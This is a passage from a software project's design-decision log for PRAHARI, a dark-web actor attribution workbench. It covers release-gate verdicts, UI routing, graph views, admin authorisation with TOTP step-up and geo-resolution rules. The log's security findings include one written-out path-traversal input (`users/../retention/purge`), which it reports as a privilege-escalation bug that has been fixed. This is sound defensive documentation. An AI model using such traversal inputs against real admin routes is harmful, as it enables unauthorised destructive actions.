A build authenticates nobody; a running server does. Refusing to boot is correct; refusing to build is
over-reach that makes the honest thing — checking secrets — look like a broken repository. The build
phase is exempted via `NEXT_PHASE`, and the runtime guard is unchanged. Both behaviours verified in
isolation and regression-tested.

### DEC-052 — The gate is a CONDITIONAL PASS, and that is the honest verdict.
Nine of twelve release-gate objectives pass mechanically, including the two defects above.
**371 tests are green on a genuinely fresh clone.**

Three cannot be certified by the author:

- **Manual checklists by two teammates who did not write the phase.** Every manual layer in
  `docs/TESTLOG.md` is author-run. That satisfies the checklist mechanically and not its intent.
- **D3.1 Claude review with N = ALL**, which explicitly requires "an independent reviewer, not the
  author".
- **A Sepolia anchor.** The contract, its twelve tests and the whole seal → verify → tamper flow are
  real and exercised end to end, but only against local Anvil. Nothing is on a public chain.

Marking those PASS would be exactly the failure this phase exists to catch, in the phase that exists to
catch it. `v2.0-sih` is not tagged. The stop rule stands: anything not passing is described as roadmap,
never demoed as working.


### DEC-053 — The compose project name is pinned; the demo must not depend on the folder name.
Docker Compose derives its project name from the **directory**. From a clone in any folder not named
`prahari` it looked for project `p`, did not see the running stack, and tried to start a second one --
which then collided with the fixed `container_name` values.

`npm run demo` hung for **142 seconds** and left nothing listening. Any judge cloning into a directory
with a different name would have hit exactly this, and the launcher failed *silently*, which is the
worst possible failure at step one of a demo.

`name: prahari` is now pinned in `docker-compose.yml`, the launcher checks the daemon by container name
rather than the project-scoped `docker compose ps`, and both the compose-up and the health wait fail
loudly with a reason.

### DEC-054 — "Ready" must mean the first click is fast, not just that the port is bound.
The first request touching fusion or the audit ledger triggers Splink training and profile building --
about 20 seconds cold. That exceeded the proxy's 8-second timeout and rendered as **"engine offline" on
a completely healthy engine**. The development machine never saw it, because it was always warm from
earlier calls.

A judge who opens the Audit panel first would have seen a broken product.

The engine now warms `build_signals()` and the calibrator in a background thread at startup, and the
proxy ceiling moves 8s → 45s as a backstop. Warming is an optimisation and never fatal: if it fails,
the engine logs it and the first request is merely slow.

Measured after the fix: first audit call **11.4 s** on a cold clone, 25/25 journey, 7/7 demo steps.

---

## v2.1 Upgrade — Phase 1

### DEC-055 — The skin is drawn once per **visit**, and semantic colour is not skin colour.

Two decisions, because investigating the first one uncovered the second, and the second is the one
that mattered.

#### The reported bug

`SKIN_PICKER_SCRIPT` re-rolled on every document load. Any full navigation, hard refresh, or route
that escaped the client router repainted the entire product in a different palette **and moved the
side rail from one edge to the other** mid-investigation. Measured before the fix: a five-route walk
produced four different draws (`plasma → arctic → ember → arctic → plasma`).

Read as decoration this is a papercut. It is not decoration. An analyst comparing two actors builds a
mental map keyed on colour, and this moved it under them between routes.

#### The decision — a four-tier resolution, resolved pre-paint

| # | Source | Lifetime |
|---|---|---|
| 1 | `?skin=` query param | that request only; does **not** overwrite the session draw |
| 2 | `localStorage["prahari.skin.lock"]` | permanent, user-set |
| 3 | `sessionStorage["prahari.skin.session"]` | **the visit** — the fix |
| 4 | fresh random draw | written to sessionStorage immediately |

Tier 1 deliberately does not persist. `?skin=abyss` exists for screenshots and bug reports; if it
overwrote the visit, sharing a link would silently repaint the recipient's session when they navigated
away from that URL.

The record is `{ skin, layout, fontPair, drawnAt, v: 2 }` and is **versioned**. A record of an older
shape is discarded and redrawn, never crashed on. Every field is validated against the registry before
it is applied — a stored record is attacker-influencable on a shared machine, and it lands in a DOM
attribute.

**Layout and type are in the same record.** A rail that jumps sides between routes is worse than a
palette change, and the type pair used to be pinned by the skin, so type could only change when the
palette did. It is now its own draw; `html[data-font="0|1|2"]` blocks sit after the skin blocks so
they win at equal specificity, and a document with no `data-font` (JS disabled) keeps the skin's choice.

**Storage may throw, not just be empty.** Safari private mode, embedded webviews and some enterprise
policies make even *reading* `sessionStorage` throw. Every access is individually wrapped and falls
back to a module-scoped in-memory singleton, so the draw is still stable for the SPA lifetime. A skin
is not worth a blank page: the outermost catch still sets `ember`/`a`/`0` rather than leaving the
document unstyled.

The pre-paint script must be dependency-free inline JS, so it cannot import the resolver. It is a
hand-written mirror of `resolveDraw()`. Three layers keep them honest, and no one of them is enough:
`skinSession.test.ts` covers the resolver exhaustively, `skins.test.ts` asserts the script carries the
same keys, tiers and guards, and the e2e walk drives the **real** script across six routes and a hard
reload. DEC-042 is the standing reminder of what a unit test alone proves about browser-only code.

**Cost:** a returning visitor now sees the same skin all visit rather than a new one per page. That is
the point, but it does make the generative engine less immediately visible — so `ThemeControl` gained
a caption stating which tier is in force (`Session skin · Ember` / `Locked · Abyss`), and Reshuffle,
Lock and Unlock are now three distinct, labelled behaviours. Unlock keeps the current draw: re-rolling
there would punish the user for asking a question about persistence.

#### The decision underneath — `--sig-*` and `--ent-*` are declared in `:root` and nowhere else

Chasing the first bug surfaced the real one. Every signal root on the evidence trail was drawn with:

```css
linear-gradient(90deg, var(--accent-dim), var(--accent))
```

All six roots in **one** colour, and that colour skin-dependent. Bar length was the only encoding, and
the single thing colour did carry on that panel was the thing guaranteed to change on every load. The
graph legend was better — hardcoded hex — but the same literals were hand-copied into three places
(`ActorGraph3D`'s `KIND_COLORS`, its `LEGEND`, and `ActorGraphPanel`'s `LEGEND`), which is drift
waiting to happen.

Colour that carries meaning now lives in `lib/signals.ts` as the single source of truth, mirrored into
`:root` as `--sig-identity`, `--sig-infra`, `--sig-financial`, `--sig-temporal`, `--sig-linguistic`,
`--sig-social` and `--ent-*`. **No `html[data-skin]` block may redefine one.** Three.js integers are
derived from the same hex literals, so the 3D view and its legend cannot drift.

Asserted structurally rather than by six screenshots: a custom property never redefined in any skin
block is identical across skins *by construction*, which is a stronger statement than six renders
agreeing. `signals.test.ts` checks both directions (no skin defines one; each is declared exactly
once) and the e2e reads the computed values under all six skins — with a **control** asserting
`--accent` *does* vary, so a passing test proves something.

INV-11 still holds: every colour-coded row carries its label, the swatch is `aria-hidden`, and a
reader who cannot distinguish the colours loses nothing.

**Measured:** 48/48 e2e (13 new DEC-055 checks), 220 web unit tests, `/workbench` first-load JS
unchanged at 131 kB / 239 kB.

---

## v2.1 Upgrade — Phase 2

### DEC-056 — The workbench becomes ten routes with one shared actor object.

The cockpit put a rail, a 3D graph, a full profile and a four-tab drawer in one
viewport. Every panel was compressed to roughly a quarter of the screen, and the
evidence trail — the panel the whole project argues from — was a 400 px column
with a scrollbar.

#### The decision

Ten routed surfaces under `app/workbench/`, sharing a persistent shell:

```
/workbench                     Overview   · triage bands, model health, sources, graph, cases
/workbench/actors              Actor list · full-width, faceted, sortable, deep-linkable
/workbench/actor/[id]          Dossier    · profile, identifiers, personas, provenance
/workbench/actor/[id]/graph    Graph lab  · full viewport (Phase 3 builds on this)
/workbench/actor/[id]/evidence Evidence   · the arithmetic, full width
/workbench/actor/[id]/timeline Timeline   · per persona, not aggregated
/workbench/actor/[id]/chain    Chain flow · clusters, off-ramps, live trace
/workbench/tor                 Tor timing lab
/workbench/case/[caseId]       Case ledger
/workbench/compare             Side-by-side comparison (new)
/workbench/classic             The original cockpit, unchanged
```

**Nothing was rewritten.** Every route mounts the existing panel component;
`routes.test.ts` asserts each import, so Phase 3 starts from the same
`ActorGraphPanel` rather than a fork of it.

#### One source of truth for the actor

`lib/workspace.ts` — a zustand store with a cache keyed by actor id. The
obvious implementation (each route fetching what it needs) refetches on every
tab change and, worse, can render two different confidences for one actor if a
refetch lands between two paints. In a product whose claim is that every
published score reproduces from its trail exactly (INV-10), a dossier reading
0.991 while the context bar reads 0.987 is not a rendering glitch — it is the
screen contradicting itself about evidence.

Measured, not asserted: the store counts its own calls, and the test proves
**two network calls per actor** (profile, timeline) across five route visits.
The e2e reads the confidence off all five actor routes in a real browser and
asserts one distinct value. Identity is checked with `toBe`, not `toEqual` —
two structurally equal objects from two fetches would pass a deep-equal check
and still be the bug.

#### Keeping `/workbench` working, and what it cost

With the flag off, `/workbench` must be the cockpit, byte for byte. Expressing
that as a branch inside `page.tsx` put **both** components into the route's
bundle: 256 kB first-load JS against 103 kB for the Overview alone, because the
dead branch dragged the cockpit and three.js in with it. A dynamic `import()`
did not help — Next's client-reference graph includes both branches.

So the split moved to the routing layer: a **rewrite** in `next.config.mjs`
sends `/workbench` to `/workbench/classic` when the flag is off. The URL is
unchanged, the component served is the same one, and neither build pays for the
branch it does not use.

That rewrite had to be `beforeFiles`. A bare array from `rewrites()` is
`afterFiles`, which applies only when **no page matched** — and
`app/workbench/page.tsx` always matches, so the rewrite silently never fired and
the flag-off build served the Overview at `/workbench`. Nothing in the flag-on
gate could have caught it; it was found by running the journey against a
flag-off build, which is now something the journey does on its own (below).

#### The journey detects the flag instead of assuming it

`NEXT_PUBLIC_FF_WORKSPACE` is inlined at build time, so `journey.mjs` cannot
read it. It asks the page — the presence of `nav[aria-label="Workspace"]` — and
drives the cockpit at whichever path serves it in that build. With the flag off
it asserts the flag-off guarantee instead (cockpit at `/workbench`, no shell)
and prints four `SKIP` lines rather than passing vacuously. Assuming the flag
was on is precisely how the rewrite bug survived its first run.

#### FINDING-07, closed

The command palette (Cmd/Ctrl-K) is the workspace's first dialog, and it wires
`lib/a11y.ts`'s `trapFocus` back in. That function — the DEC-042 fix, which cost
a Playwright run to find — had been referenced by no code since the v2 rebuild
removed every dialog. The four dialog checks the journey lost in Phase 0b are
restored against it, plus focus restoration, which is asserted by opening the
palette **from a real control**: opening with Ctrl-K from an unfocused page
leaves `activeElement` as `<body>`, which is not focusable, so there is nothing
to restore to and the check would be meaningless.

#### Two bugs found by walking the routes in a browser

- **The engine caps `limit` at 200.** `api.actors("", 0, 500)` returned 422, and
  the Overview and actor list both used it.
- **A 422's `detail` is an array of objects**, not a string. Rendering it threw
  React error #31 and blanked the whole route — a validation error took the page
  down instead of printing one line. `detailOf()` in `lib/api.ts` now coerces any
  `detail` shape to text, and every call site that renders one goes through it.

Neither was reachable by a unit test of the code as written; both took ten
seconds to find with a browser pointed at the real engine.

#### The compare view computes nothing

It shows shared identifiers, shared hosts, shared markets and shared signal
roots — all facts about what two actors published — and states on screen that
these are observations, not a verdict. The inference from "same PGP key" to
"same operator" is the fusion engine's, is published with a calibrated
confidence and a false-merge rate, and is not restated here. A comparison view
is exactly where a tool starts implying things, and rule 5 of the playbook says
no new surface may imply more than the code does. `routes.test.ts` asserts the
file contains no scoring arithmetic.

#### Honest degradation on the Overview

Neo4j is unreachable on the free tier, so `/graph/stats` returns
`available: false`. The identity-graph block renders **"Not available"** plus the
reason and what still works — it does not draw six zeroes, because a zero is a
measurement and "we could not ask" is not (INV-5, INV-9).

**Measured:** 280 web unit tests, 71/71 e2e with the flag on, 51/51 with it off,
`/workbench` 103 kB first-load JS (the cockpit stays 243 kB at
`/workbench/classic`).

---

## v2.1 Upgrade — Phase 3

### DEC-057 — Eleven views of one graph model, each stating what its layout means.

There was exactly one graph visualisation: a 3D force layout. It is a good one,
but a force layout answers exactly one question — *what is the overall shape* —
and an analyst asking "which identifier carries this link" or "why are these two
personas the same actor" got no help from it.

#### The decision

Eleven representations at `/workbench/actor/[id]/graph`, behind
`NEXT_PUBLIC_FF_GRAPH_LAB`, with a control column on the left and a node
inspector on the right:

| View | Answers |
|---|---|
| 3D force (**existing, unchanged**) | overall shape, who clusters with whom |
| 2D force | precise reading, printing, reproducible screenshots |
| Ego network (1/2/3 hops) | what one node is directly attached to |
| Adjacency matrix | dense subgraphs, where a force layout turns to hairball |
| **Evidence DAG** | *why* two personas are linked — the courtroom view |
| Temporal | how the network formed over time |
| Bipartite persona ↔ identifier | which identifier carries the link |
| Value flow | where value moves |
| Communities | how the graph partitions |
| Comparison diff | what two actors share |
| 2D linkage list (**existing fallback**) | every edge, as text |

`ActorGraphPanel` and `ActorGraph3D` are **mounted unchanged** as the default
view. `graphModel.test.ts` asserts `ActorGraph3D` still owns its private builder
and does not import the shared model — the lab wraps it, it does not replace it.

#### One model, eleven renderers

`lib/graphModel.ts` builds the graph once. Eleven builders each walking the
profile their own way would let the matrix and the force layout disagree about
whether an edge exists, and the analyst would have no way to tell which was
lying. A test asserts the shared model and `ActorGraph3D`'s private builder
produce the same node and edge counts, so they cannot drift.

#### Determinism was hand-rolled, deliberately

The gate requires the 2D layout to be **identical across two runs** — otherwise a
screenshot in a report cannot be reproduced, and two analysts comparing notes see
different pictures of the same actor.

d3-force seeds its initial positions from `Math.random` with no supported way to
inject a generator, so the layout is a hand-written force solver over a
mulberry32 PRNG seeded from the **actor id**, with a fixed iteration count rather
than a decaying alpha. "Usually the same" is not determinism.

Two details that matter:

- **Coincident nodes are nudged along a deterministic axis**, never randomly.
  The repulsion step divides by distance; the coincident case is the one that
  produces `NaN` and silently blanks the entire drawing. A test pins every node
  to one point and asserts finite output.
- **The fit-to-stage pass is a uniform scale plus a translation.** Without it the
  layout settled into a thumbnail in the middle of a 900×800 stage — found by
  screenshotting the real page, not by any test. Uniform is the load-bearing
  word: it preserves every ratio between distances, so the caption's claim
  ("distance is meaningful; absolute position is not") stays exactly as true
  after fitting. A non-uniform stretch would make it false.

#### Every view carries a caption, and the captions are the honesty surface

A picture of a network implies a claim, and an unlabelled picture implies
whichever claim the viewer already held. So each view states **what its layout
means**, and several captions exist specifically to refuse an over-reading:

- The **community** view names the source of its partition on screen. Neo4j GDS
  Louvain and a local weakly-connected-components pass are different claims —
  WCC finds disconnected pieces, not communities, and labelling one as the other
  would overstate it. Neo4j is unreachable on the free tier, so the local pass is
  usually what runs, and the view says so.
- The **value flow** view states that bar width is transaction count, **not
  amount**. The engine clusters by co-spend and does not value the flows; drawing
  a width from a number it does not have would be an invention.
- The **comparison diff** shows shared node values and explicitly does not
  conclude that two actors are one operator.
- The **fallback** promises completeness: no edge dropped, summarised or rounded
  away.

#### The node inspector invents nothing

Every row is read from a payload the engine returned; unknown facts render as
"not recorded" rather than a blank or a plausible default. For each edge it names
the signal root, the strength, and the reliability exponent `r` — or says
"not published for this root" when `/fusion/model` did not report one.

It also names **what root-cause collapse discarded**, not just what survived.
Collapse is the most contestable step in the model and the one an opposing expert
attacks; a panel showing only survivors would be hiding the argument. The
`roots_collapsed` payload already carries it.

Actions are gated on what can actually succeed: "trace on chain" appears on
wallet nodes only, "open in SANGAM" on hosts only. An action that cannot succeed
should not be on screen — offering a chain trace for a PGP key implies a
capability that does not exist.

#### Exports carry provenance, or they are not exhibits

PNG, SVG, JSON and GraphML, each stamped with the actor id, the **complete filter
state**, the view, a UTC timestamp and the engine version. A PNG of a filtered
graph with no record of the filter is a picture nobody can challenge — an
opposing expert cannot reproduce it, and neither can the analyst who made it
three months later. Where the engine did not report a version, the export says
"not reported by the engine" rather than inventing one.

GraphML is built with `createElementNS` + `textContent` + `XMLSerializer`, never
string templating (INV-6). A node label is market-sourced text, and interpolating
it into an XML template is precisely the shape of FINDING-02. A test runs the
payload set through it and asserts the label survives **escaped** while the
element count is unchanged.

Two bugs were found writing that exporter, both by running it:

- `document.implementation.createDocument` under happy-dom yields an **HTML**
  document whose root is `<html>`, and declaring the namespace with
  `setAttribute("xmlns", …)` emits a **second** xmlns attribute beside the
  implicit one — malformed XML. Fixed by seeding through `DOMParser` and using
  `createElementNS`, which is also simply the correct API.
- happy-dom's `DOMParser` then **rejects `attr.name` and `attr.type`** — the dot
  is legal in an XML attribute name and GraphML mandates exactly those two — so
  re-parsing valid output failed. Well-formedness is therefore asserted in the
  e2e, where a real `DOMParser` exists; asserting it under happy-dom would be
  testing happy-dom. DEC-042 remains the standing reminder.

#### Performance, stated rather than hoped

Above **800 nodes** a force layout is both an unreadable hairball and an O(n²)
solve on a mid-range laptop. The lab degrades to the adjacency matrix and **says
why**, naming the node count and how to get back — silently rendering a different
view than the one asked for is the tool lying about what it is showing. The
budget is measured: an 800-node fixture lays out under 2 s, a typical actor under
250 ms. The 3D bundle stays behind `dynamic()`, and a test asserts the lab never
imports the three module directly, which would defeat that boundary.

#### The fallback is automatic and announced

`prefers-reduced-motion` or missing WebGL falls back to the complete linkage
list, with a banner saying which condition applied. Information always survives
(INV-11).

**Measured:** 373 web unit tests, 19 new e2e checks, all eleven views captioned
and exception-free, `/workbench/actor/[id]/graph` 123 kB first-load JS.

---

## v2.1 Upgrade — Phase 4

### DEC-058 — Five roles, one authorisation table, three enforcement layers.

The playbook's warning for this phase is blunt: *a half-secured admin panel is a
worse outcome than no admin panel.* So the order of work was security first, and
the panel exists only because the hardening finished.

**The hierarchy** extends `officer` / `analyst` without touching either — both
keep exactly the permissions they had, spread from `authConfig.ROLE_PERMISSIONS`
rather than retyped so the two files cannot drift:

```
viewer     read
analyst    read, investigate, verify                                  (unchanged)
officer    + assign, seal, export                                     (unchanged)
supervisor + manage:cases, manage:sources, approve, reassign
admin      + manage:users, manage:roles, manage:retention
```

It is a strict hierarchy and a test asserts that. A hole in it — a supervisor
who cannot do something an officer can — turns every permission question into a
special case.

**`impersonate:none` was not implemented as a permission.** The playbook lists
it for admin; minting a permission whose *value* is the string "none" would make
`hasPermission(role, "impersonate:none")` return **true**, the exact opposite of
the intent. The capability does not exist anywhere in the table, and a test
asserts no role holds any `impersonate` permission.

**One table, three layers.** `ADMIN_ROUTES` is data, not scattered `if`
statements, precisely so it can be walked exhaustively:

1. `middleware.ts` adds `/command` as a ROUTE guard. It runs on the Edge
   runtime, which cannot read the in-process step-up store or the session
   registry, so all it can honestly do is refuse traffic with no session — and
   that is all it is asked to do.
2. `lib/adminGuard.ts` is **the control**, on the Node side. Order is asserted:
   IP allowlist → session → CSRF → role → step-up → rate limit. The allowlist is
   first because a deployment that restricted the panel to an office range
   should not be spending bcrypt or ledger writes on traffic it already refused;
   the rate limit is last because a refusal above it should not consume anyone's
   budget.
3. The **engine authorises independently** (DEC-060).

The UI hides what a role cannot do. That is a courtesy, not a control, and the
authZ matrix is what proves the difference.

#### FINDING-08 — a privilege-escalation shape, found by the matrix

`users/../retention/purge` matched the `users` rule through the
`startsWith("users/")` prefix test. It would have been authorised under
`manage:users` while any consumer that normalised the path would then execute
`retention/purge`, which requires `manage:retention`. **Authorise as one route,
execute as another.**

Fixed by **refusing** traversal input rather than normalising it: normalising
means the guard and its consumer must agree forever on one canonical form, and
any future disagreement is another instance of this bug. A traversal segment has
no legitimate use in an admin path.

This is the entire argument for generating the matrix instead of listing the
cells someone thought of. Nobody would have written that test case by hand.

#### Credentials

bcrypt cost **10 → 12** (~4x the work per guess; ~250 ms per login, which nobody
notices and an offline cracker does), plus a **pepper** from the environment so
a database dump alone is not enough to start guessing. Existing hashes keep
working — bcrypt encodes its cost, an un-peppered hash is accepted on a second
comparison, and the result says `needsRehash` so it is upgraded on the owner's
next login. The prime directive applies to credentials too.

The policy runs on **set and reset only, never on login**: an existing password
that no longer meets policy must still let its owner in so they can change it.
Length ≥ 12 and an **offline** breach-list check — no composition theatre.
"One uppercase and one symbol" pushes people to `Password1!` and buys nothing.
The list is one password per line and nothing else: a data file with a syntax is
a data file that can be got wrong, and a comment line silently treated as a
forbidden password would be invisible.

---

### DEC-059 — Step-up TOTP, and a session model that can actually be revoked.

The threat is specific: a session cookie taken from an unlocked laptop, or an
analyst who walked away. A password protects login; nothing protected the
mutations after it. `otplib` (MIT) does the RFC 6238 arithmetic; everything
around it is ours, because those are the parts that get security wrong.

**Four properties, each with a test that would fail loudly:**

1. **Single-use codes.** Accepting the same six digits twice inside their window
   means a shoulder-surfed code works for whoever saw it. Replay protection
   spans the same ±1 window the drift allowance does — otherwise the code simply
   works thirty seconds later.
2. **Drift is ±1 window.** Wider is friendlier and materially weaker: every
   extra window is another thirty seconds of validity for an observed code.
3. **Recovery codes hashed at rest and single-use.** SHA-256 with the pepper,
   not bcrypt: they are ~50 bits from a CSPRNG, so they are not brute-forceable
   from a hash the way a human password is, and a fast hash means verifying eight
   of them opens no CPU-exhaustion path. Alphabet excludes `0 O 1 I L`.
4. **The token lives server-side against the session.** The verify endpoint
   returns *no token*: the grant is recorded against the session id the browser
   already holds in its httpOnly cookie. There is deliberately nothing for a
   client to store, replay or forge.

**Destructive actions need a FRESH step-up** — 120 seconds, not the 15-minute
window. For an irreversible action, "fourteen minutes ago" is not proof that the
person is at the keyboard now.

#### A bug the injected clock hid

`verifyStepUp(state, code, pepper, atMs)` used `atMs` for the replay bookkeeping
but **not for the cryptographic check** — otplib verifies against its own epoch,
which defaults to the real clock. A code generated for two windows ago verified
as valid. Found by the drift tests, and only because writing them exposed that
`authenticator.generate(secret, { epoch })` silently ignores its second
argument. The epoch is now set and restored around both calls, in a `finally`
so a throw cannot leave a stale epoch behind for the next caller.

#### Sessions

Short JWT (15 min rotation) inside an **absolute 8-hour cap** — one shift, so a
session left open overnight is not valid in the morning. A registry gives
revocation real teeth: **an unknown session id is treated as revoked**, which is
the fail-closed direction. Trusting any well-signed token whose session we have
no record of would make the revocation list decorative. Role change and password
reset revoke every session the user holds, because a demoted user keeping their
old permissions until a token expires is the thing this exists to prevent.

CSRF is a double-submit token **derived** from the session id and the secret
rather than stored, so there is no second registry to keep in step. `SameSite=Lax`
already blocks plain cross-site form posts; this is the second layer, because Lax
has real gaps and these mutations cannot be undone.

#### A bug my own hardening introduced, and how it surfaced

I set the session cookie's `Secure` attribute from `NODE_ENV`. `next start` sets
`NODE_ENV=production`, so a production build served over plain HTTP — every local
run, every CI run, and the first boot of a deployment before TLS is in front of
it — marked the cookie Secure, the browser dropped it, and **login silently
bounced back to `/login` in a redirect loop**. Found by pointing the browser
journey at a production build.

`Secure` now follows `NEXTAUTH_URL`'s scheme, which is the authoritative
statement of how the app is actually reached. The `__Secure-` name prefix is
tied to the same value, because browsers reject that prefix on a cookie that is
not Secure and the two must agree.

---

### DEC-060 — The engine authorises admin calls independently of the proxy.

*"The web proxy already checked"* is not an authorisation model. On a Render
deployment the engine has its own public URL, so anything that can reach the
network can reach `/admin/*` directly.

**A second proxy, deliberately separate.** `/api/admin/[...path]` is not a
branch inside the existing read proxy. Admin paths mutate evidence and need a
role check, CSRF, step-up, a rate limit and a ledger entry; bolting that onto
the read proxy would mean one function whose behaviour depends on which arm of a
branch it took, and the failure mode of getting that branch wrong is an
unauthenticated purge. `/admin` is **not** in the read proxy's `ALLOWED` array
and a test asserts it never becomes so. The admin proxy's allowlist is *derived*
from `ADMIN_ROUTES`, so a route can never be reachable without a rule nor have a
rule without being reachable.

**The service token is bound to the request.** HMAC-SHA256 over five claims plus
path and method, 60-second life. A token minted for `GET /admin/users` cannot be
replayed against `POST /admin/retention/purge` — without that binding, a token
captured from any admin read would be a general-purpose admin credential for its
lifetime. The engine's `admin/auth.py` verifies it and re-checks the role
against **its own copy** of the permission table: an engine that asked the web
layer what a role may do would be trusting the thing it is meant to be checking.
Tests on both sides assert the two tables have not drifted.

A missing `ENGINE_SERVICE_SECRET` in production is a refusal, like DEC-045's
secret — but the proxy turns the throw into a **503 naming what is missing**
rather than an unhandled 500 with a stack trace in the log and nothing on screen
(INV-9).

#### CRUD: three rules

1. **Nothing is ever hard-deleted.** Delete sets `deleted_at` and `deleted_by`.
   Deleted rows disappear from reads and **survive in exports** — a record a
   defence expert cannot find is a record the prosecution looks like it hid. Even
   a retention purge soft-deletes. There is no hard-delete endpoint.
2. **Optimistic concurrency.** Every write carries the `updated_at` the client
   last saw; a mismatch is a 409 naming *both* timestamps, never a silent
   overwrite.
3. **Every mutation returns its diff**, and the diff is what goes into the
   ledger payload. An entry that says "updated" without saying what changed is
   not evidence of anything.

An attribution override requires a **written justification**, is flagged
`override: true` with the analyst's name, and can never be mistaken for a model
output. Bulk import and retention purge are **dry-run by default**; the live
purge additionally needs a named second approver who is not the caller, because
one person able to irreversibly remove evidence is the failure this guards
against, whether the cause is a mistake or coercion.

The ledger's closed action set was **extended, not bypassed**: sixteen
`admin.*` actions were added to `ACTIONS`, and an action absent from that tuple
still cannot be written at all.

#### Reports and analytics

Four new reports on the **existing** `lib/report.ts` `createElement` path — no
new HTML string templating, however convenient, and the FINDING-02 payload set
runs through every one of them. Each carries the Merkle root, the engine version,
the generation time, the honesty statement, and a transaction hash **only when a
public anchor exists** — with an explicit "no public anchor, any seal is local
only" line when it does not, because silence there would let a reader assume
otherwise. A failed chain verification leads the subtitle rather than sitting in
a footnote under a table nobody reaches.

Analytics reports **signal contribution** — how often each root survives collapse
versus is discarded — which is genuinely diagnostic and which nobody could see
before. An uncomputable scope answers `available: false` with a reason instead of
returning zeroes, because a zero is a measurement (INV-5).

**Measured:** 885 web unit tests (including a 351-assertion authZ matrix and 50
TOTP tests), 401 engine tests, and the full refuse → enrol → verify → replay →
write → soft-delete → chain flow exercised in a real browser.

---

## v2.1 Upgrade — Phase 5

### DEC-061 — Three coordinate classes, distinguished by shape, and one of them is a refusal.

Every point on the SANGAM map is exactly one of:

| Class | Meaning | Marker |
|---|---|---|
| **RESOLVED** | host → DNS A/AAAA → geo-IP returned a real location | solid filled pin |
| **DERIVED** | no resolution; a stable coordinate standing for a known hosting or exchange region. **Not a measured location** | hollow pin, **dashed** ring, no pulse |
| **UNAVAILABLE** | nothing to place | **not plotted**; listed with the reason |

**Shape, not colour.** Colour is skin-dependent after DEC-055 and fails for
colour-blind readers, so the distinction survives greyscale. The legend uses the
same grammar as the markers.

#### FINDING-09 — a live INV-1 violation, found and fixed here

`routers/geo.py::_resolve` called `socket.gethostbyname()` on **any** host it
was given, including a `.onion`. The lookup failed, so the response looked
correct — but **the query was issued**, and INV-1 is about what the process
does, not about what it returns. The existing spy test in `test_infra.py`
patched `socket.getaddrinfo`, a different function, and never covered the geo
router at all.

Proven with a spy before fixing:

```
gethostbyname called with: ['secretmarketxyz.onion']
INV-1 VIOLATED
```

The check is now **first** — before the cache and before any socket call. Put
anywhere later, a cached or racing path could still issue the lookup. The
refusal is a *feature*, so it says so: `onion — resolution refused by design`,
with a chain step reading *"PRAHARI never resolves or contacts a .onion host
(INV-1). No DNS query was issued."* Five spy tests now cover both the new
resolver and the original code path, which is still exported and still reachable.

#### FINDING-06 — fixed, and its tests flipped

`lib/geoderive.ts` emitted a Binance off-ramp for **every** actor —
`Math.max(1, p.infrastructure.length)` guaranteed the first iteration always ran
— stamped `inferred: false` and captioned *"Wallet-cluster cash-out reaches
Binance. Known exchange region."* A fabricated cash-out claim drawn with the
styling of a measurement. Found in Phase 0b by a suite that was one hour old,
pinned as `it.fails` through Phases 1–4 so the defect stayed visible while the
suite stayed green, and fixed here.

Two changes: an off-ramp is emitted **only** from evidence the actor's own
profile names, and when one is emitted it is `inferred: true` with the sentence
*"not where any transaction occurred"* — an exchange's corporate region is not
where a transaction happened. The three `it.fails` cases are now ordinary
assertions, which is exactly what "the tests flip the moment someone fixes it"
was for.

#### The hard rules, each with a test

- **A DERIVED coordinate is rounded to one decimal place** (~11 km). Six
  decimals would imply metre precision the rule does not have, and a
  street-level zoom on a region is a lie about the data.
- **A DERIVED point has no city, ASN, IP or provider.** A region is not a city
  and has no ASN; populating either would be a placeholder dressed as a
  measurement.
- **No random jitter, ever.** Two hosts that genuinely share a location get two
  *identical* coordinates and are clustered with a count badge. Scattering them
  to look prettier is fabrication. The classifier's AST is scanned for `random`,
  `shuffle` and `uuid` — scanning the text would have matched the module's own
  prose about not using them.
- **Determinism across processes**, not just across calls: two subprocesses are
  spawned and their output compared, because two analysts comparing screenshots
  must see the same map.
- **A host matching no rule gets no point at all.** Not a hashed coordinate —
  that was FINDING-06's shape.

#### Freshness and re-resolution

Every point carries `resolved_at`; anything past the 24-hour window renders
muted with an age chip, because a stale location presented as current is a false
statement. "Re-resolve now" shows the new answer **beside** the old one rather
than replacing it — an analyst checking whether infrastructure moved needs both.

---

### DEC-062 — The engine extends `/geo`, and the class survives leaving the tool.

`/geo/host` and `/geo/hosts` keep their shape and their 32-host cap; every field
they returned before is still returned, and a caller reading `resolved` and
`lat`/`lng` keeps working. What is added sits beside them: `class`, a timestamped
`resolution_chain`, `asn`, `reverse_dns`, `resolver_used`, `resolved_at` and
`cache_age_s`, plus `/geo/asn`, `/geo/actor/{id}/footprint`,
`/geo/certificate-links` and `/geo/sources`.

**The footprint draws on three real sources**, and invents nothing to fill the
map out: clearnet hosts (the engine classifies each), `.onion` identifiers
(UNAVAILABLE by construction), and market names (DERIVED, **only** where a rule
exists).

**`ttl` is null.** The stdlib resolver does not expose it, and reporting 300
because it is a common default would be exactly the plausible guess INV-5
forbids. A test asserts the field stays null and that the reason is written down.

**A disk cache with a stated TTL** (six hours), so a 512 MB free instance never
re-resolves in a loop and a demo does not hammer `ipwho.is` into rate-limiting
mid-presentation. The **cache age is shown in the UI**, never hidden.

**Exports keep the class.** GeoJSON and CSV both carry it, and an UNAVAILABLE
point is exported as a feature with **null geometry** rather than dropped — a
file that silently omits them tells the recipient there were four hosts when
there were seven, and the ones it lost are the `.onion` refusals, which are the
most interesting rows in the file. Round-trip tests parse both back and compare.

**Comparison refuses to read precision that is not there.** Selecting two points
gives distance and shared facts only when both are RESOLVED; if either is
DERIVED the comparison is refused with a written reason naming which point and
why. It is never refused silently.

**Tile failure is stated.** If the tile provider is unreachable, a banner says so
and the points draw over a plain graticule — not a blank grey rectangle that
looks like a bug.

**Measured:** 51 engine geo tests (including five INV-1 spies and a
cross-process determinism check), 30 client class tests, 19 geoderive tests with
FINDING-06's three now passing as ordinary assertions.

---

## v2.1 Upgrade — Phase 6

### DEC-063 — A footer on every page, and a status dot that never lies about a sleeping service.

The footer links PRAHARI v1 at `https://prahari-6njh.onrender.com` — the
Jabalpur geofence console this project grew out of — and states, on every page,
what the system does and does not claim.

#### The status dot is the reason the link is worth having

v1 is a free Render instance and is asleep most of the time. A plain link sends
a judge to a page that takes thirty seconds to appear and looks broken; a dot
reading **"offline"** would be wrong twice over — the service is fine, and
nobody who read that would click.

So there are four states, and the last two are the point:

| State | Meaning |
|---|---|
| `live` | answered inside the budget, with the latency |
| `waking` | reachable but slow, or timed out — a cold start. Says **"waking — may take 30–60 s"** |
